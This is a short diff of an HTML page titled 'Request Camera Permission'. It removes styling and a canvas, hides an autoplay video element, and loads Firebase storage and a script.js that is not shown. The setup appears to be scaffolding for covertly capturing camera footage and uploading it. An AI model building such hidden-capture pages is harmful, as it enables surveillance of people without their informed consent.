@@ -4,36 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Request Camera Permission</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #000000;
-        }
-        #message {
-            font-size: 20px;
-            text-align: center;
-            padding: 20px;
-            border: 2px solid #333;
-            background-color: #998686;
-            box-shadow: 0 4px 8px rgba(255, 255, 255, 0.1);
-        }
-        video {
-            display: none; /* Hide the video element */
-        }
-        canvas {
-            display: none; /* Hide the canvas element */
-        }
-    </style>
 </head>
 <body>
     <div id="message">Requesting camera...</div>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay style="display:none;"></video> <!-- Hidden video -->
     <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js"></script>
     <script src="script.js"></script>
